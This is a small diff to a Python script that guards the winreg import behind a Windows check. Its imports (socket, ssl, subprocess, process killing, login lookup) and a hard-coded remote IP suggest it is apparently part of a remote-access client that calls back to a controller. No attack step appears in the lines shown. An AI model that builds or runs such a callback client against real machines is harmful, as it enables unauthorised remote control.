@@ -3,15 +3,16 @@ import socket, platform, ssl, subprocess
 from printlib import *
 import importlib
 from time import time, sleep
-from os import remove, path, getpid, kill, getlogin
+from os import remove, path, getpid, kill, getlogin, name
 from datetime import datetime
 from sys import exit, builtin_module_names
 from signal import SIGTERM
 from random import randint, uniform
 
-winreg_exists = importlib.find_loader('winreg')
-if winreg_exists:
-    import winreg
+if name  == "nt":
+    winreg_exists = importlib.find_loader('winreg')
+    if winreg_exists:
+        import winreg
 
 UUID = "67cf26b8-9942-11ea-a2db-bc14ef68ef25"   #python -c 'import uuid; print(uuid.uuid1())'
 remote_ip = '192.168.119.149'
